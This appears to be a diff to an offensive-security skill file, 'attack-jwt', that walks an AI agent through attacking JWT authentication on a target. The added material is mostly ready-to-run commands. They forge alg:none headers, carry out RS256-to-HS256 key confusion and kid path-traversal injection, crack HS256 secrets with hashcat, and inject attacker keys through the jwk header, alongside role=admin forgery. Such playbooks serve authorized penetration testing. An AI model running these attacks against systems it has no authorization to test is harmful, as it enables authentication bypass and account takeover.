@@ -2,6 +2,8 @@
 name: attack-jwt
 description: Use when a target authenticates with JWTs and you need to test signature, algorithm, claim, and key-handling weaknesses.
 metadata:
+  acordia:
+    family: web-attack
   cyberstrike:
     source: .cyberstrike/skill/attack-jwt/SKILL.md
     commit: 359655518
@@ -23,7 +25,7 @@ jwt_tool EYTOKEN
 
 # Manual decode
 echo "HEADER.PAYLOAD.SIG" | cut -d. -f1 | base64 -d 2>/dev/null
-echo "HEADER.PAYLOAD.SIG" | cut -d. -f2 | base64 -d 2>/dev/null
+echo "HEADER.PAYLOAD.SIG" | cut -d. -f2 | base64 -d 2>/dev/null | jq .
 ```
 
 Check for:
@@ -94,6 +96,10 @@ python3 /tmp/jwt_forge.py EYTOKEN --payload sub=1 --sign none
 
 # HS256 with known/weak key
 python3 /tmp/jwt_forge.py EYTOKEN --payload role=admin --sign hs256 --key <(echo -n "secret")
+
+# Manual header encoding, where python3 is unavailable
+# Header: {"alg":"none","typ":"JWT"}
+echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_'
 ```
 
 ### Phase 3: Key Confusion (RS256 → HS256)
@@ -107,6 +113,9 @@ curl -s https://TARGET/.well-known/jwks.json
 # Convert JWK to PEM (e.g. via jwt_tool's JWK-to-PEM helper or manual conversion),
 # then sign HS256 using the PEM bytes as the HMAC secret
 python3 /tmp/jwt_forge.py EYTOKEN --payload role=admin --sign hs256 --key public.pem
+
+# jwt_tool equivalent — key confusion using the PEM public key as the HMAC secret
+jwt_tool JWT_TOKEN -X k -pk public.pem
 ```
 
 ### Phase 4: kid Injection
@@ -117,9 +126,30 @@ python3 /tmp/jwt_forge.py EYTOKEN --header 'kid=../../../../../../dev/null'
 
 # kid pointing to accessible file
 python3 /tmp/jwt_forge.py EYTOKEN --header 'kid=/proc/sys/kernel/hostname'
+
+# jwt_tool equivalent — inject kid, then re-sign HS256 with an empty key
+jwt_tool JWT_TOKEN -I -hc kid -hv "../../dev/null" -S hs256 -p ""
 ```
 
-### Phase 5: Verify Impact
+### Phase 5: Weak Secret Cracking
+
+```bash
+# Brute force an HS256 signing secret from a wordlist
+hashcat -a 0 -m 16500 JWT_TOKEN wordlist.txt
+
+# Or with jwt_tool
+jwt_tool JWT_TOKEN -C -d wordlist.txt
+```
+
+### Phase 6: jwk Header Injection
+
+Embed an attacker-generated public key in the token's own `jwk` header and sign with the matching private key. A server that trusts the embedded key accepts the forgery without ever consulting its own key store.
+
+```bash
+jwt_tool JWT_TOKEN -X i
+```
+
+### Phase 7: Verify Impact
 
 ```bash
 # Test tampered token
